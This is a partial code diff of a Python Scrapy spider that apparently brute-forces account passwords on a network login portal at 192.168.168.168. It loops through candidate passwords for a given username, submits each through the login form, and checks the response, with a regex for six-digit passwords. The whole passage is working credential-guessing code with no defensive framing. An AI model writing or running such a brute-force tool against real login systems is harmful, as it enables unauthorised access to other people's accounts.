@@ -26,19 +26,19 @@ class SascSpider(scrapy.Spider):
                 raise ValueError
         except ValueError:
             pass
-        self.url = 'http://192.168.168.168/0.htm'
+        self.start_urls = ['http://192.168.168.168/0.htm']
         self.formdata = {"DDDDD": str(self.username), 'upass': ''}
         self.password_re = re.compile('[0-9]{6}')
 
         super().__init__()
 
-    def start_requests(self):
+    def parse(self, response):
         for password in self.passwords:
             self.formdata['upass'] = password
-            yield scrapy.FormRequest(url=self.url, formdata=self.formdata,
-                                     callback=self.parse)
+            yield scrapy.FormRequest.from_response(response=response, formdata=self.formdata,
+                                                   callback=self.check_parse)
 
-    def parse(self, response):
+    def check_parse(self, response):
         body = str(response.request.body)
         status = response.xpath('//input/@value').extract()
         result = ''.join(map(str, status))
